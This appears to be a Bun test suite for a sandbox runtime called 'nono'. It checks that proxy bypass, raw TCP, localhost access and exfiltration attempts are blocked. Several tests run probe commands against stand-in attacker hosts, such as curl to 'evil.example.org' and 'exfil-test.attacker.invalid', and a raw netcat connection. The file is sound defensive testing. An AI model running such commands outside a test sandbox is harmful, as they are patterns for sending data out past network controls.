import { test, expect, describe, afterEach } from "bun:test";
import { nonoRuntime } from "../../src/sandbox/nono";

/** When running inside a nono sandbox, nested nono proxy network tests cannot reach the internet. */
const insideNonoSandbox: boolean = !!process.env.HTTPS_PROXY;
import { mkdtemp, rm, readFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

// ── Helpers ──────────────────────────────────────────────────────────

const tmpDirs: string[] = [];

afterEach(async () => {
  for (const d of tmpDirs) {
    await rm(d, { recursive: true, force: true }).catch(() => {});
  }
  tmpDirs.length = 0;
});

async function makeTmpDir(): Promise<string> {
  const d = await mkdtemp(join(tmpdir(), "deer-sec-test-"));
  tmpDirs.push(d);
  return d;
}

function nonoRun(dir: string, cmd: string, allowlist: string[] = ["example.com"]) {
  const args = nonoRuntime.buildCommand(
    { worktreePath: dir, allowlist },
    ["sh", "-c", cmd],
  );
  return Bun.spawn(args, { stdout: "pipe", stderr: "pipe" });
}

// ── A1: Direct TCP bypass — Landlock TCP must block non-proxy connections ─

describe("nono network isolation", () => {
  test("direct HTTPS bypassing proxy is blocked by Landlock TCP", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' --max-time 3 -s https://example.com > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test("direct HTTP bypassing proxy is blocked by Landlock TCP", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' --connect-timeout 2 -s http://example.com > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test.skipIf(insideNonoSandbox)("allowlisted host is reachable through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl -s --max-time 5 https://example.com > ${dir}/out.txt 2>&1`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content).toContain("Example Domain");
  }, 10000);

  test("non-allowlisted host is blocked through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl -s --max-time 5 https://evil.example.org > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});

// ── A2: Direct TCP to arbitrary ports ────────────────────────────────

describe("TCP port restrictions", () => {
  test("cannot open raw TCP to arbitrary host:port", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `echo test | nc -w1 93.184.216.34 80 > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test("cannot connect to localhost services directly", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' -s --connect-timeout 1 http://127.0.0.1:8080 > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
      [], // no allowlist
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});

// ── A3: DNS exfiltration ─────────────────────────────────────────────

describe("DNS exfiltration", () => {
  test("DNS queries for non-allowlisted domains do not exfiltrate data", async () => {
    const dir = await makeTmpDir();
    // DNS resolution itself may work (UDP is not Landlock-filtered),
    // but the TCP connection that follows must be blocked.
    // This test verifies the end-to-end: even if DNS resolves,
    // the data cannot be sent over TCP.
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' -s --max-time 2 http://exfil-test.attacker.invalid > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});
